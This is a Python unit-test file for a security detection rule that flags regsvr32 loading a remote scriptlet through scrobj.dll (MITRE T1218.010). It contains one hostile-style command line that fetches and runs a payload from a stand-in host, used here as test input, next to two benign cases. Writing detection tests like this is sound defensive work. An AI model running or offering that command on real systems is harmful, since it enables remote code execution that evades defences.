import unittest

from backend.detection import run_detections
from tests.helpers import event


class Regsvr32DetectionTests(unittest.TestCase):
    def test_remote_regsvr32_scriptlet_execution_is_high(self):
        alerts = run_detections([
            event(
                1,
                source='windows',
                event_type='windows_event',
                process_name='regsvr32.exe',
                command_line=(
                    'regsvr32.exe /s /n /u '
                    '/i:https://example.invalid/payload.sct scrobj.dll'
                ),
            )
        ])

        self.assertTrue(
            any(
                alert.rule_id == 'DET-WIN-006'
                and alert.severity == 'high'
                and alert.technique == 'T1218.010'
                for alert in alerts
            )
        )

    def test_local_dll_registration_does_not_alert(self):
        alerts = run_detections([
            event(
                1,
                source='windows',
                event_type='windows_event',
                process_name='regsvr32.exe',
                command_line=r'regsvr32.exe /s C:\\Program Files\\Vendor\\approved.dll',
            )
        ])

        self.assertFalse(any(alert.rule_id == 'DET-WIN-006' for alert in alerts))

    def test_remote_url_without_scrobj_does_not_alert(self):
        alerts = run_detections([
            event(
                1,
                source='windows',
                event_type='windows_event',
                process_name='regsvr32.exe',
                command_line='regsvr32.exe /i:https://example.invalid/config.dll vendor.dll',
            )
        ])

        self.assertFalse(any(alert.rule_id == 'DET-WIN-006' for alert in alerts))


if __name__ == '__main__':
    unittest.main()
